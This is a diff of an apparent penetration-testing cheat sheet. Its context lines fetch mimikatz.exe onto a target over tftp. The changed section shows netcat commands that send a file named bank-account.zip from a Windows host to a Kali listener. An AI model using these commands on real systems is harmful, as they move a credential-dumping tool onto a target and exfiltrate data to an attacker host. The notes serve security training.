@@ -45,12 +45,12 @@ Using MSF. Start MSF before starting these steps:
 	3. run
   	4. tftp -i 10.10.10.10 GET mimikatz.exe
 
-#NC Transfer
-(How to transfer from Windows to Kali)
-Windows
-1. nc -nv 10.10.10.10 4444 < file.txt
-Kali
-2. nc -nlvp 4444 > file.txt
+#NC (Windows to Kali)
+Windows:
+- C:\> nc -nv 10.11.0.61 4444 < bank-account.zip
+Kali:
+- nc -nlvp 4444 > bank-account.zip
+
 
 LFI / RFI
 ----------------
